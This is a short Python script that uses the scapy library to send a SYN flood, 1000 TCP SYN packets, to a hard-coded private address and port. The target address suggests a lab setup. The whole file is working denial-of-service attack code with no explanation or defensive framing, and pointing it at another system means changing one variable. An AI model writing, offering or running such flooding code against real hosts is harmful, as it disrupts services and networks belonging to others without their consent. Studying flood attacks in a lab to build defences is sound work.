from scapy.all import send
from scapy.layers.inet import IP, TCP


def syn_flood(target_ip, target_port, num_packets):
    packet = IP(dst=target_ip) / TCP(dport=target_port, flags='S')
    send(packet, count=num_packets, verbose=1)


target_ip = "192.168.56.1"
target_port = 10000
num_packets = 1000

syn_flood(target_ip, target_port, num_packets)
